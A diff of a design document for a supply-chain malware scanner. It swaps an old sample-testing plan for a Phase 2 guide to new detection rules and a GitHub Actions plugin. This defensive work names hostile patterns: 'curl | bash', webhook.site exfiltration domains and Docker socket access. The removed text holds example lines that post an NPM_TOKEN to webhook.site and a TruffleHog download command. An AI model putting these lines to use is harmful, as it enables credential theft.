@@ -1,683 +1,506 @@
-Decision Document: Phase 2 Sample Testing Framework & Tier 1 Detection Rules
-Date: 2025-02-07
-Status: APPROVED
-Scope: Phase 2 architecture for continuous threat sample evaluation + Tier 1 detection capabilities
+# Dev Trust Scanner — Phase 2: Detection Rule Expansion
 
-Executive Summary
-Phase 1 delivered a production-ready scanner with solid fundamentals (94% coverage, plugin architecture, multi-format reporting). Phase 2 shifts focus to empirical validation against real-world malware samples from opensourcemalware.com.
-This decision document defines:
+> **Purpose**: Phase 2 implementation guide for Claude Code. This document defines the new detection rules, the GitHub Actions plugin, and the implementation sequence. Reference this file before writing any code.
+>
+> **Phase 1 Status**: ✅ Complete — 146 tests passing, 94% coverage, 13+ rules deployed, plugin architecture operational.
+>
+> **Phase 2 Mission**: Expand detection capabilities with 7 new rules targeting active attack campaigns, and ship a new GitHub Actions plugin as a first-class scanning surface.
 
-Sample Testing Framework: Architecture for acquiring, safely handling, and continuously evaluating threat samples
-Tier 1 Detection Rules: High-impact, low-false-positive rules targeting active Shai-Hulud campaign patterns
-Gap Analysis Workflow: Systematic methodology for identifying and closing detection gaps
+---
 
+## Phase 2 Scope
 
-1. Sample Testing Framework Architecture
-1.1 Design Principles
-Automated Threat Intelligence Integration
+### In Scope
 
-Pull samples from opensourcemalware.com tagged with relevant campaigns
-Track provenance (sample ID, source URL, tags, campaign name, fetch date)
-Maintain both malicious corpus and known-good validation set
+- 7 new detection rules (see DEC-P2-001 through DEC-P2-007)
+- New `github_actions` plugin (first-class, same standing as `npm_lifecycle` and `vscode_tasks`)
+- Test coverage for every new rule against both malicious samples AND known-good packages
+- Updated README with new capabilities
 
-Safe Handling
+### Out of Scope (Deferred)
 
-Never execute samples - static analysis only
-Store samples outside git repository (.gitignore all sample directories)
-Neutered versions only in committed test fixtures (tokens removed, domains replaced)
-Sandboxed environment for manual analysis (disposable VM/container)
+- Typosquatting detection (`core/typosquatting.py`) — deferred to future phase
+- Multi-file correlation logic — deferred to future phase
+- Sample corpus testing framework — deferred to future phase
+- Automated sample fetching from opensourcemalware.com — deferred to future phase
 
-Continuous Validation
+---
 
-Weekly automated runs against full corpus
-Regression testing as rules evolve
-Track detection rates over time (CSV metrics)
-Compare scanner findings to published threat intelligence
+## Detection Rules — Implementation Decisions
 
-Gap-Driven Development
+### DEC-P2-001: TruffleHog Binary Download Detection
 
-Document every missed sample with manual analysis
-Extract patterns for new detection rules
-Validate new rules against known-good packages before deployment
-Update test suite with malware-derived test cases
+**Priority**: 1 (Highest — actively used in Shai-Hulud campaigns)
 
-1.2 Directory Structure
-dev-trust-scanner/
-├── samples/                          # NOT in git (.gitignore)
-│   ├── malicious/                    # Real malware samples
-│   │   ├── shai-hulud/               # Campaign-organized
-│   │   │   ├── sample-001/           # Individual packages
-│   │   │   └── sample-002/
-│   │   ├── contagious-interview/
-│   │   └── metadata.json             # Sample provenance tracking
-│   └── known-good/                   # Validation set
-│       ├── react/                    # Top npm packages
-│       ├── lodash/
-│       └── metadata.json
-├── tools/
-│   ├── fetch_samples.py              # Download/import samples
-│   ├── validate_samples.py           # Run scanner against corpus
-│   ├── gap_analysis.py               # Compare results to known-malicious
-│   └── neuter_sample.py              # Sanitize for test fixtures
-├── analysis/
-│   ├── gap-reports/                  # Per-sample miss analysis
-│   │   └── 2025-02-10-sample-sha1-hulud-v2.md
-│   ├── validation-reports/           # Weekly test runs
-│   │   └── 2025-02-10-validation.json
-│   └── metrics/                      # Historical tracking
-│       └── detection-rates.csv       # Time-series data
-└── tests/
-    └── fixtures/
-        ├── malicious/                # Neutered samples for unit tests
-        │   └── shai-hulud-neutered/  # Tokens removed, safe to commit
-        └── known-good/               # Legitimate code patterns
-1.3 Component Specifications
-tools/fetch_samples.py
-Purpose: Acquire samples and manage corpus
-Features:
+**Plugin**: `npm_lifecycle`
 
-Manual Import Mode (Phase 2.1): Import locally downloaded samples from opensourcemalware.com
+**What to detect**: Scripts that download the TruffleHog binary for credential/secret scanning on victim machines.
 
-import-sample command with campaign/tags/sample-id parameters
-Validates sample structure (package.json present, etc.)
-Records metadata in metadata.json
+**Patterns**:
 
+- URLs containing `trufflesecurity/trufflehog` or `trufflehog` binary download paths
+- Binary extraction commands following TruffleHog downloads (`tar`, `unzip`, `chmod +x`)
+- Execution of downloaded TruffleHog binary (`./trufflehog`, `trufflehog filesystem`, `trufflehog git`)
 
-Known-Good Fetcher: Download top-N npm packages for validation
+**Severity**: CRITICAL
 
-Uses npm registry API to fetch popular packages
-Default top-100 for false-positive testing
-Tracks as separate "validation-set" campaign
+**Rule IDs**: NPM-LC-XXX (assign next available sequence numbers)
 
+**Rationale**: TruffleHog is a legitimate tool, but downloading and executing it via npm lifecycle scripts is a strong indicator of credential theft. This is a core technique in the Shai-Hulud worm campaign.
 
-Future: OSM API Integration (when available)
+**Remediation guidance**: "This package downloads and executes TruffleHog, a secret-scanning tool. Legitimate packages do not scan your filesystem for credentials during installation. Remove this package immediately and rotate any exposed secrets."
 
-Direct fetch with tag filtering
-Automated weekly pulls via cron/GitHub Actions
+**Test requirements**:
 
+- Fixture with realistic Shai-Hulud-style postinstall script downloading TruffleHog
+- Fixture with legitimate package referencing TruffleHog in README/docs (must NOT trigger)
+- Validate against top 100 popular npm packages — zero false positives expected
 
+---
 
-Metadata Schema:
-json{
-  "samples": [
-    {
-      "sample_id": "sha1-hulud-variant-2",
-      "source": "https://opensourcemalware.com/sample/xyz",
-      "tags": ["shai-hulud", "npm-worm"],
-      "campaign": "shai-hulud",
-      "sha256": "abc123...",
-      "fetched_at": "2025-02-07T10:30:00Z",
-      "known_malicious": true,
-      "references": [
-        "https://reversinglabs.com/blog/shai-hulud-analysis"
-      ]
-    }
-  ]
-}
-CLI Examples:
-bash# Import manually downloaded sample
-python tools/fetch_samples.py import-sample \
-    ~/Downloads/malicious-pkg/ \
-    --campaign shai-hulud \
-    --tags shai-hulud,npm-worm \
-    --sample-id sha1-hulud-v2
+### DEC-P2-002: GitHub Actions Workflow Injection Patterns
 
-# Fetch validation set
-python tools/fetch_samples.py fetch-known-good --top-n 100
+**Priority**: 2 (Persistence mechanism — Shai-Hulud campaign)
 
-# Future: Direct fetch
-python tools/fetch_samples.py fetch-malicious --tags shai-hulud --limit 20
-tools/validate_samples.py
-Purpose: Run scanner against corpus and generate validation reports
-Features:
+**Plugin**: `github_actions` (NEW PLUGIN — see DEC-P2-008)
 
-Corpus Scanning: Iterate through all samples in samples/malicious/ or samples/known-good/
-Result Comparison: Match scanner findings against known-malicious metadata
-Detection Metrics:
+**What to detect**: Malicious GitHub Actions workflow files planted by compromised packages or scripts.
 
-Total samples scanned
-Detected (findings > 0)
-Missed (known-malicious with no findings)
-False positives (known-good with findings)
-Detection rate percentage
+**Patterns**:
 
+- Known malicious workflow filenames: `shai-hulud-workflow.yml`, variations
+- Workflow files with suspicious triggers: `workflow_dispatch` combined with `schedule` for persistence
+- Self-hosted runner registration within workflow files
+- Workflow files that download and execute external scripts (`curl | bash`, `wget | sh`)
+- Workflows that exfiltrate secrets via environment variable dumping (`env`, `printenv`)
+- Suspicious `runs-on: self-hosted` without clear organizational context
 
-Report Formats:
+**Severity**: CRITICAL for known malicious filenames, HIGH for suspicious patterns
 
-JSON: Machine-readable for CI/metrics tracking
-Markdown: Human-readable summary for weekly reviews
-CSV: Time-series metrics for trend analysis
+**Rule IDs**: GHA-XXX (new rule ID prefix for GitHub Actions plugin)
 
+**File targets**: `.github/workflows/*.yml`, `.github/workflows/*.yaml`
 
+**Rationale**: Attackers use malicious workflow files for persistence — they execute on push/schedule without developer intervention. The Shai-Hulud campaign specifically plants workflow files that register self-hosted runners.
 
-Output Schema (validation-reports/YYYY-MM-DD-validation.json):
-json{
-  "scan_date": "2025-02-10T14:00:00Z",
-  "scanner_version": "0.2.0",
-  "corpus": {
-    "malicious_samples": 47,
-    "known_good_samples": 100
-  },
-  "results": {
-    "detected": 38,
-    "missed": 9,
-    "false_positives": 2,
-    "detection_rate": 0.809
-  },
-  "missed_samples": [
-    {
-      "sample_id": "shai-hulud-v3",
-      "campaign": "shai-hulud",
-      "reason": "novel_obfuscation"
-    }
-  ],
-  "false_positives": [
-    {
-      "sample_id": "crypto-js",
-      "findings": ["high_entropy"],
-      "severity": "low"
-    }
-  ]
-}
-CLI Examples:
-bash# Scan all malicious samples
-python tools/validate_samples.py --malicious --output analysis/validation-reports/
+**Remediation guidance**: "This workflow file contains patterns associated with malicious GitHub Actions injection. Review all workflow files in .github/workflows/ and remove any you did not create. Audit your repository's Actions history for unauthorized runs."
 
-# Scan validation set for false positives
-python tools/validate_samples.py --known-good
+**Test requirements**:
 
-# Full corpus scan with metric tracking
-python tools/validate_samples.py --all --update-metrics
-tools/gap_analysis.py
-Purpose: Generate detailed analysis for missed samples
-Features:
+- Fixtures with known Shai-Hulud workflow patterns
+- Fixtures with legitimate CI/CD workflows (build, test, deploy) — must NOT trigger
+- Fixtures with common open-source workflows (release-please, dependabot) — must NOT trigger
+- Edge case: legitimate use of `workflow_dispatch` + `schedule` (e.g., nightly builds)
 
-Interactive Mode: Prompt analyst to review missed samples
-Template Generation: Create gap-report markdown with pre-filled metadata
-Pattern Extraction: Suggest potential detection rules based on manual findings
-IOC Extraction: Pull domains, file patterns, code signatures from sample
+---
 
-Gap Report Template (analysis/gap-reports/YYYY-MM-DD-sample-{id}.md):
-markdown# Gap Analysis: {sample_id}
+### DEC-P2-003: Repository Creation with Campaign Markers
 
-**Date**: 2025-02-10  
-**Campaign**: shai-hulud  
-**Sample Source**: https://opensourcemalware.com/sample/xyz  
-**Published Intel**: [ReversingLabs report](https://...)
+**Priority**: 3 (Campaign attribution)
 
-## Scanner Result
-- **Findings**: None
-- **Expected Detection**: High (known-malicious sample)
+**Plugin**: `npm_lifecycle`
 
-## Manual Analysis
+**What to detect**: Code that creates GitHub repositories with known malware campaign marker strings.
 
-### Obfuscation Techniques
-- Double base64 encoding: `btoa(btoa(payload))`
-- Hex escape sequences in variable names
-- Dynamic property access: `process['en'+'v']`
+**Patterns**:
 
-### Execution Flow
-1. Install hook: `preinstall` script
-2. Delayed execution: `setTimeout(() => eval(...), 5000)`
-3. Network exfiltration: `axios.post('https://webhook.site/xxx', secrets)`
+- String literals: `"Shai-Hulud"`, `"Sha1-Hulud"`, `"Sha1-Hulud: The Second Coming"`
+- String literals: `"Goldox-T3chs"`, `"Goldox-T3chs: Only Happy Girl"`
+- Repository name patterns with `-migration` suffix used as campaign markers
+- GitHub API calls (`api.github.com/user/repos`) combined with the above markers
+- `git init` + `git remote add` combined with marker strings
 
-### Key Indicators
-- **Domains**: webhook.site, pastebin.com
-- **Files**: bun_installer.js, 3nvir0nm3nt.json
-- **Markers**: "Goldox-T3chs" in comments
+**Severity**: CRITICAL
 
-## Detection Gaps
+**Rule IDs**: NPM-LC-XXX (assign next available)
 
-### Primary Gap
-Current rules don't detect delayed execution patterns (`setTimeout` + `eval`)
+**Rationale**: These strings are campaign identifiers used by threat actors to track worm propagation. Their presence in any package is a definitive indicator of compromise.
 
-### Secondary Gaps
-- Missing axios + process.env correlation
-- No webhook.site domain check
-- Doesn't flag campaign markers in comments
+**Remediation guidance**: "This package contains code that creates GitHub repositories with known malware campaign markers. This is a definitive indicator of the Shai-Hulud supply chain worm. Remove this package immediately, audit your GitHub account for unauthorized repositories, and revoke any GitHub tokens that may have been exposed."
 
-## Proposed Rules
+**Test requirements**:
 
-### Rule 1: Delayed Execution + Eval
-```yaml
-id: NPM-LC-005
-pattern: setTimeout.*eval|setInterval.*eval
-severity: high
-confidence: high
+- Fixtures containing each marker string in realistic attack context
+- Fixtures with legitimate migration-related package names — must NOT trigger on `-migration` alone
+- Fixtures with "Dune" references in comments/docs (the name Shai-Hulud comes from Dune) — must NOT trigger on contextual references, only on code patterns
+
+---
+
+### DEC-P2-004: Docker Privilege Escalation Attempts
+
+**Priority**: 4
+
+**Plugin**: `npm_lifecycle`
+
+**What to detect**: Scripts that attempt Docker socket access or container escape techniques.
+
+**Patterns**:
+
+- Docker socket paths: `/var/run/docker.sock`
+- Privileged container flags: `--privileged`, `--cap-add=ALL`, `--cap-add=SYS_ADMIN`
+- Docker socket mounting: `-v /var/run/docker.sock`
+- Container escape indicators: `nsenter`, `chroot /host`
+- Docker API calls to local socket
+
+**Severity**: HIGH
+
+**Rule IDs**: NPM-LC-XXX (assign next available)
+
+**Rationale**: No legitimate npm package should be accessing the Docker socket or requesting elevated container privileges during installation. This indicates either container escape or host compromise attempts.
+
+**Remediation guidance**: "This package attempts to access the Docker daemon socket or use privileged container capabilities. Legitimate npm packages do not require Docker access during installation. Review the script and remove the package if you did not explicitly expect Docker interaction."
+
+**Test requirements**:
+
+- Fixtures with Docker socket access in postinstall scripts
+- Fixtures with Docker-related tooling packages (docker-compose wrappers, etc.) — calibrate to avoid false positives on legitimate Docker tools
+- Document expected false positive rate for Docker ecosystem packages
+
+---
+
+### DEC-P2-005: Webhook.site Exfiltration Patterns
+
+**Priority**: 5 (Common across many campaigns)
+
+**Plugin**: `npm_lifecycle`
+
+**What to detect**: Data exfiltration to free webhook collection services.
+
+**Patterns**:
+
+- Domains: `webhook.site`, `webhook-test.com`, `requestbin.com`, `pipedream.com`, `hookbin.com`, `requestcatcher.com`
+- URL patterns: `https://webhook.site/` followed by UUID
+- HTTP requests (`curl`, `wget`, `fetch`, `axios`, `http.request`) targeting these domains
+- Encoded/obfuscated versions of these domains (base64, hex, string concatenation)
+
+**Severity**: CRITICAL
+
+**Rule IDs**: NPM-LC-XXX (assign next available)
+
+**Rationale**: Free webhook services are heavily used for exfiltrating stolen credentials, environment variables, and tokens. No legitimate npm package sends data to webhook.site during installation.
+
+**Remediation guidance**: "This package sends data to a webhook collection service (webhook.site or similar). This is a common technique for exfiltrating stolen credentials and environment variables. Remove this package immediately and rotate any tokens or credentials that may have been exposed."
+
+**Test requirements**:
+
+- Fixtures with various webhook exfiltration patterns (curl, fetch, axios)
+- Fixtures with obfuscated webhook URLs (base64-encoded domain)
+- Fixtures with legitimate webhook documentation/testing packages — calibrate carefully
+- Validate no false positives on packages that mention webhook.site in README/docs only
+
+---
+
+### DEC-P2-006: Self-hosted GitHub Runner Installation
+
+**Priority**: 6 (Persistence mechanism)
+
+**Plugin**: `npm_lifecycle` and `github_actions`
+
+**What to detect**: Code that installs GitHub Actions self-hosted runners for persistence.
+
+**Patterns**:
+
+- Runner download URLs: `actions/runner/releases`
+- Runner configuration: `config.sh`, `config.cmd` with `--url` and `--token`
+- Runner service installation: `svc.sh install`, runner as systemd service
+- Runner token requests: API calls to `/actions/runners/registration-token`
+- Runner binary execution: `run.sh`, `run.cmd`
+
+**Severity**: CRITICAL
+
+**Rule IDs**: NPM-LC-XXX for npm plugin, GHA-XXX for GitHub Actions plugin
+
+**Rationale**: Installing self-hosted runners gives attackers persistent code execution on victim infrastructure. This is used in Shai-Hulud for maintaining access after initial compromise.
+
+**Remediation guidance**: "This package or workflow installs a GitHub Actions self-hosted runner. Self-hosted runners should only be configured through your organization's official process. An unauthorized runner installation indicates an attempt to establish persistent access to your infrastructure. Remove immediately and audit for any runners registered to your repositories."
+
+**Test requirements**:
+
+- Fixtures with runner installation scripts in npm lifecycle hooks
+- Fixtures with workflow files that configure self-hosted runners
+- Fixtures with legitimate self-hosted runner setup documentation — must NOT trigger
+
+---
+
+### DEC-P2-007: Preinstall vs Postinstall Timing Analysis
+
+**Priority**: 7
+
+**Plugin**: `npm_lifecycle`
+
+**What to detect**: Packages using `preinstall` scripts, which execute earlier and have wider impact than `postinstall`.
+
+**Patterns**:
+
+- Presence of `preinstall` script in package.json
+- Combined with any other suspicious indicator (network calls, encoded strings, file system access)
+- `preinstall` scripts that do more than simple validation or environment checks
+
+**Severity**: MEDIUM for `preinstall` presence alone, escalate to HIGH when combined with other indicators
+
+**Rule IDs**: NPM-LC-XXX (assign next available)
+
+**Rationale**: `preinstall` runs before dependencies are installed, giving attackers earlier execution. Most legitimate packages use `postinstall` or `prepare`. The presence of `preinstall` with suspicious content is a stronger signal than `postinstall` with the same content.
+
+**Remediation guidance**: "This package uses a preinstall script, which executes before dependencies are installed. While not inherently malicious, preinstall scripts run earlier in the installation process and are less commonly used by legitimate packages. Review the script contents carefully."
+
+**Test requirements**:
+
+- Fixtures with `preinstall` containing suspicious patterns (higher severity)
+- Fixtures with `preinstall` doing legitimate work (environment detection, native compilation checks)
+- Fixtures comparing same suspicious content in `preinstall` vs `postinstall` — verify severity difference
+- Validate against top 100 npm packages that use `preinstall` legitimately
+
+---
+
+## New Plugin Decision
+
+### DEC-P2-008: GitHub Actions Plugin — First-Class Plugin
+
+**Decision**: Create a new `github_actions` plugin at `src/dev_trust_scanner/plugins/github_actions/` with the same standing and architecture as `npm_lifecycle` and `vscode_tasks`.
+
+**Structure**:
+
+```
+src/dev_trust_scanner/plugins/github_actions/
+├── __init__.py
+├── scanner.py
+└── rules/
+    └── gha_rules.yaml
 ```
 
-### Rule 2: Exfiltration Domain List
-```yaml
-id: NPM-NET-003
-domains:
-  - webhook.site
-  - requestbin.com
-context: network_call + env_access
+**Plugin metadata**:
+
+- Name: `github_actions`
+- Supported files: `.github/workflows/*.yml`, `.github/workflows/*.yaml`
+- Rule ID prefix: `GHA-`
+
+**Scanner responsibilities**:
+
+- Parse YAML workflow files
+- Evaluate rules from `gha_rules.yaml`
+- Handle malformed YAML gracefully (per DEC-009 — never crash on bad input)
+- Report findings with file path, line numbers where possible, matched pattern, and severity
+
+**Design constraints**:
+
+- Same plugin interface as existing plugins: `scan()`, `get_metadata()`, `get_supported_files()`
+- Plugin must stay under 300 LOC — shared logic goes to `static_analysis.py`
+- No network calls — static analysis only
+- Must integrate seamlessly with existing orchestrator and CLI
+
+**Rule ID convention**: `GHA-001`, `GHA-002`, etc.
+
+**Rationale**: GitHub Actions is a premiere attack surface for supply chain attacks. Workflow injection and self-hosted runner abuse are active TTPs in current campaigns. This plugin should be featured prominently in documentation and README.
+
+---
+
+## Implementation Sequence
+
+> **Follow this exact sequence. Do not skip ahead. Commit after each step.**
+
+### Step 1: GitHub Actions Plugin Scaffolding
+
+Create the plugin directory structure, empty `scanner.py` with the plugin interface stubs, empty `gha_rules.yaml`, and `__init__.py`. Register the plugin with the orchestrator. Verify the scanner recognizes the new plugin (runs without errors, reports zero findings).
+
+**Commit**: `feat(gha-plugin): scaffold GitHub Actions plugin with interface stubs`
+
+**Checkpoint**: Run full test suite — all 146 existing tests must pass. New plugin loads without error.
+
+### Step 2: GitHub Actions Detection Rules (DEC-P2-002)
+
+Implement the workflow injection detection rules in `gha_rules.yaml` and wire up `scanner.py` to evaluate them. Start with known malicious filename detection, then add pattern-based rules.
+
+**Commit**: `feat(gha-plugin): implement workflow injection detection rules`
+
+**Checkpoint**: New tests for each GHA rule. Existing tests still pass. Run against sample legitimate workflow files to verify zero false positives.
+
+### Step 3: Self-hosted Runner Rules in GitHub Actions Plugin (DEC-P2-006, GHA portion)
+
+Add runner installation detection rules to `gha_rules.yaml`. These are specific to workflow file context.
+
+**Commit**: `feat(gha-plugin): add self-hosted runner installation detection`
+
+**Checkpoint**: Tests cover runner patterns in workflow files. False positive check against legitimate runner setup documentation.
+
+### Step 4: TruffleHog Binary Download Rules (DEC-P2-001)
+
+Add TruffleHog detection rules to `npm_rules.yaml`. Implement in the npm_lifecycle plugin.
+
+**Commit**: `feat(npm-plugin): add TruffleHog binary download detection`
+
+**Checkpoint**: Tests with Shai-Hulud-style fixtures. Validate against top 100 npm packages.
+
+### Step 5: Webhook.site Exfiltration Rules (DEC-P2-005)
+
+Add webhook exfiltration detection rules to `npm_rules.yaml`. Include obfuscated domain patterns.
+
+**Commit**: `feat(npm-plugin): add webhook.site exfiltration detection`
+
+**Checkpoint**: Tests with various exfiltration patterns. Validate no false positives on webhook documentation packages.
+
+### Step 6: Repository Creation Markers (DEC-P2-003)
+
+Add campaign marker string detection rules to `npm_rules.yaml`.
+
+**Commit**: `feat(npm-plugin): add campaign marker string detection`
+
+**Checkpoint**: Tests for each marker string. Validate no false positives on Dune-related content or legitimate migration packages.
+
+### Step 7: Docker Privilege Escalation Rules (DEC-P2-004)
+
+Add Docker socket and privilege escalation rules to `npm_rules.yaml`.
+
+**Commit**: `feat(npm-plugin): add Docker privilege escalation detection`
+
+**Checkpoint**: Tests for Docker patterns. Document false positive expectations for Docker ecosystem packages.
+
+### Step 8: Self-hosted Runner Rules in npm Plugin (DEC-P2-006, npm portion)
+
+Add runner installation detection to `npm_rules.yaml` for lifecycle script context.
+
+**Commit**: `feat(npm-plugin): add self-hosted runner installation detection in lifecycle scripts`
+
+**Checkpoint**: Tests for runner patterns in postinstall/preinstall scripts.
+
+### Step 9: Preinstall Timing Analysis (DEC-P2-007)
+
+Implement preinstall risk escalation logic. This may require scanner-level logic beyond YAML pattern matching — if `preinstall` is detected, escalate severity of co-occurring findings.
+
+**Commit**: `feat(npm-plugin): add preinstall timing risk analysis`
+
+**Checkpoint**: Tests comparing severity levels. Validate against packages with legitimate preinstall usage.
+
+### Step 10: Integration Testing & Documentation
+
+- Run full test suite — target > 90% coverage
+- Scan a set of known-good npm packages — document any false positives
+- Update README with new plugin and rule documentation
+- Update this decisions.md with any implementation notes or deviations
+
+**Commit**: `docs: update README and decisions.md for Phase 2 capabilities`
+
+**Checkpoint**: All tests pass, coverage > 90%, README reflects current capabilities.
+
+---
+
+## Rule Quality Standards
+
+All new rules MUST meet:
+
+- **False positive rate**: < 1% when scanned against top 100 popular npm packages
+- **Severity assignment**: CRITICAL, HIGH, MEDIUM, or LOW — justified in the rule decision
+- **Actionable remediation**: Every finding includes clear guidance for the developer
+- **Performance**: No single rule should add more than 100ms to scan time
+- **Test coverage**: At least one malicious fixture and one benign fixture per rule
+
+---
+
+## Validation Requirements
+
+For each new rule:
+
+1. **Malicious fixture**: Realistic test case based on published threat intelligence
+2. **Benign fixture**: Known-good configuration that must NOT trigger the rule
+3. **Top 100 validation**: Scan against top 100 popular npm packages — document results
+4. **Edge cases**: Document known edge cases and decisions made about them
+
+---
+
+## Threat Intelligence Sources
+
+Rules in this phase are informed by:
+
+- Shai-Hulud npm worm campaign (TruffleHog, workflow injection, runner abuse, campaign markers)
+- Contagious Interview VS Code campaign (existing Phase 1 rules cover this)
+- Published reports from: ReversingLabs, Wiz Security, GitLab Security, Unit 42, Sonatype
+
+---
+
+## Existing Constraints (Carried from Phase 1)
+
+These constraints remain in full effect:
+
+- **No network calls.** This tool is offline-only. No fetching, no phoning home, no update checks.
+- **Do not use `print()`.** Use `logging` or `rich.console`.
+- **Do not use `Any` type hints** unless there is a concrete, documented reason.
+- **Do not create god classes.** If a class is doing more than one thing, split it.
+- **Do not write plugins longer than 300 lines.** Move shared logic to `static_analysis.py`.
+- **Do not change the plugin interface** (`scan`, `get_metadata`, `get_supported_files`) without approval.
+- **Do not auto-generate rules.** Every detection rule must be intentional and documented with a rationale.
+- **Do not silence exceptions.** Catch them, log them, and include them in scan results per DEC-009.
+- **Do not refactor decisions.md** unless explicitly asked to.
+
+---
+
+## When to Stop and Ask
+
+### Design questions
+
+- If a rule's pattern matching is ambiguous — stop and ask
+- If a rule needs logic beyond YAML pattern matching — describe the approach and wait for approval
+- If the GitHub Actions plugin needs to deviate from the existing plugin interface — stop and ask
+
+### Test failures
+
+- If tests fail because the design doesn't work as expected — stop and explain
+- Never delete or skip a failing test to move forward
+
+### False positive concerns
+
+- If a rule triggers on a popular legitimate package — stop and report which package and why
+- Propose pattern refinement before proceeding
+
+### Scope creep
+
+- If implementing a rule naturally leads to wanting multi-file correlation — stop. That's deferred.
+- If implementing a rule naturally leads to wanting typosquatting detection — stop. That's deferred.
+- Stay within the 7 defined rules and the GitHub Actions plugin.
+
+---
+
+## Commit Message Format
+
+```
+type(scope): short description
+
+[optional body with context]
 ```
 
-## Validation Plan
-- [ ] Test Rule 1 against top-100 npm (check for false positives)
-- [ ] Add neutered sample to test fixtures
-- [ ] Re-run against this sample (verify detection)
-- [ ] Update metrics
-CLI Examples:
-bash# Generate gap report for specific sample
-python tools/gap_analysis.py --sample-id sha1-hulud-v3 --interactive
+**Types**: `feat`, `fix`, `test`, `docs`, `refactor`, `chore`
+**Scopes**: `core`, `npm-plugin`, `vscode-plugin`, `gha-plugin`, `cli`, `docs`
 
-# Batch mode for all missed samples from last validation
-python tools/gap_analysis.py --from-validation analysis/validation-reports/2025-02-10-validation.json
-tools/neuter_sample.py
-Purpose: Sanitize malicious samples for safe test fixture commits
-Features:
+**Examples**:
 
-Token Removal: Strip actual tokens, API keys, secrets
-Domain Replacement: Replace exfiltration domains with example.com
-Comment Injection: Add WARNING headers to files
-Structure Preservation: Keep obfuscation/patterns intact for detection testing
+```
+feat(gha-plugin): scaffold GitHub Actions plugin with interface stubs
+feat(gha-plugin): implement workflow injection detection rules
+feat(npm-plugin): add TruffleHog binary download detection
+test(gha-plugin): add false positive validation for legitimate workflows
+docs: update README and decisions.md for Phase 2 capabilities
+```
 
-Safety Transformations:
-javascript// BEFORE (malicious)
-const token = process.env.NPM_TOKEN;
-axios.post('https://webhook.site/xyz', { token });
+---
 
-// AFTER (neutered)
-// WARNING: This is a neutered malware sample for testing purposes only
-// Original sample: shai-hulud-v2 from opensourcemalware.com
-const token = process.env.NPM_TOKEN;
-axios.post('https://example.com/neutered', { token: 'REDACTED' });
-CLI Examples:
-bash# Neuter sample for test fixtures
-python tools/neuter_sample.py \
-    samples/malicious/shai-hulud/sample-001/ \
-    tests/fixtures/malicious/shai-hulud-neutered/ \
-    --remove-tokens --replace-domains
-1.4 Metrics Tracking
-Time-Series CSV (analysis/metrics/detection-rates.csv):
-csvdate,total_samples,detected,missed,detection_rate,false_positives,scanner_version
-2025-02-10,47,38,9,0.809,2,0.2.0
-2025-02-17,52,44,8,0.846,1,0.2.1
-Visualization: Weekly chart showing detection rate trend over time
-1.5 Weekly Workflow
-Monday: Sample Acquisition
-bash# Download new samples from opensourcemalware.com (manual for now)
-# Import into corpus
-python tools/fetch_samples.py import-sample ...
-Tuesday-Thursday: Gap Analysis & Rule Development
-bash# Run validation scan
-python tools/validate_samples.py --all --output analysis/validation-reports/
+## Checkpoint Summaries
 
-# Analyze missed samples
-python tools/gap_analysis.py --from-validation analysis/validation-reports/latest.json
+After completing each step, provide:
 
-# Develop new rules (manual work in rules/*.yml)
+- What was implemented
+- What tests pass (total count and new additions)
+- Any concerns, tradeoffs, or deviations
+- Ready for next step: yes/no
 
-# Test new rules
-pytest tests/ -v
-Friday: Validation & Commit
-bash# Re-run full validation
-python tools/validate_samples.py --all --update-metrics
+---
 
-# Check false positive rate
-python tools/validate_samples.py --known-good
+## Success Criteria
 
-# Commit if metrics improve
-git add rules/ tests/ analysis/metrics/
-git commit -m "Add NPM-LC-005: delayed execution detection (detection rate: 81% → 85%)"
+Phase 2 is complete when:
 
-2. Tier 1 Detection Rules
-2.1 Rule Metadata Schema
-Standardize all rules with metadata for campaign tracking and confidence scoring:
-yaml# rules/npm-lifecycle/trufflehog-download.yml
-metadata:
-  id: NPM-LC-001
-  created: 2025-02-07
-  updated: 2025-02-07
-  campaign: shai-hulud
-  confidence: high  # high|medium|low
-  severity: critical  # critical|high|medium|low
-  false_positive_rate: 0.0  # Measured against top-1000 npm
-  references:
-    - https://opensourcemalware.com/sample/xyz
-    - https://reversinglabs.com/blog/shai-hulud
-  mitre_attack:
-    - T1195.002  # Supply Chain Compromise: Compromise Software Supply Chain
-    - T1552.001  # Credentials from Files
-
-detection:
-  patterns:
-    - trufflesecurity/trufflehog
-    - download.*trufflehog
-  context:
-    - install_script  # Must be in package.json scripts
-  severity_modifiers:
-    - high: contains "releases/download"
-    - critical: contains "releases/download" AND env_access
-
-description: |
-  Detects downloads of TruffleHog secret scanner binary during package installation.
-  This is a signature behavior of Shai-Hulud npm worm variants that scan for secrets
-  to facilitate propagation via stolen npm tokens.
-2.2 Tier 1 Rules (Week 1-2 Priority)
-NPM-LC-001: TruffleHog Binary Download
-Target: Shai-Hulud propagation mechanism
-Confidence: High (legitimate packages don't download secret scanners)
-Expected False Positive Rate: <0.01%
-Detection Logic:
-yamlpatterns:
-  - regex: trufflesecurity/trufflehog.*/releases
-  - regex: download.*trufflehog(\.exe)?
-context:
-  location: [preinstall, postinstall, install]
-  file_write: [trufflehog, trufflehog.exe]
-Test Cases:
-
-✅ Detect: curl -L https://github.com/trufflesecurity/trufflehog/releases/download/v3.0.0/trufflehog_linux -o trufflehog
-✅ Detect: wget trufflesecurity/trufflehog/releases/latest
-❌ Ignore: Legitimate dependency on @trufflesecurity/trufflehog npm package (different pattern)
-
-
-NPM-LC-002: GitHub Actions Workflow Injection
-Target: Shai-Hulud persistence/propagation
-Confidence: High
-Expected False Positive Rate: <0.01%
-Detection Logic:
-yamlpatterns:
-  - file_creation: .github/workflows/*.yml
-  - regex: shai-hulud-workflow|goldox.*workflow
-context:
-  location: [preinstall, postinstall, install]
-  file_operations: write
-Test Cases:
-
-✅ Detect: Install script creates .github/workflows/shai-hulud-workflow.yml
-✅ Detect: Workflow file contains suspicious uses: from forked repos
-❌ Ignore: Package includes legitimate .github/workflows/ in distributed files (not created by install script)
-
-
-NPM-LC-003: Campaign Marker Strings
-Target: Shai-Hulud variants identification
-Confidence: High
-Expected False Positive Rate: 0% (strings are unique to malware)
-Detection Logic:
-yamlpatterns:
-  - regex: shai-hulud|sha1-hulud.*second coming
-  - regex: goldox-t3chs.*only happy girl
-  - regex: _sha1_hulud_|_goldox_
-context:
-  location: [comments, strings, variable_names]
-Test Cases:
-
-✅ Detect: // Shai-Hulud: The Second Coming
-✅ Detect: const marker = "Goldox-T3chs: Only Happy Girl"
-✅ Detect: Repository description contains these strings
